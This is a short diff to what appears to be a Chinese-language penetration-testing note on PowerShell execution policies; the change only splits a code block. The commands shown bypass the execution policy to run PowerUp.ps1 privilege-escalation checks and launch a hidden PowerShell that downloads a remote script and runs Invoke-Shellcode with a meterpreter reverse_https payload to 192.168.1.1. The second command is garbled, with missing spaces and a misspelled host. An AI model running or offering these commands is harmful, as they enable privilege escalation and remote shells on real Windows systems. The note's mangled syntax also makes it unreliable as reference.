@@ -43,7 +43,9 @@ powershell脚本策略有四种
 
 ```powershell
 powershell.exe -exec bypass -Command "& (Import-Module C:\PowerUp.ps1; Invoke-Allchecks)"
- 
+```
+
+```powershell
 powershell.exe -ExecutionPolicy Bypass-WindowsStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString("http://localhoat:8080"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 80
 ```
 
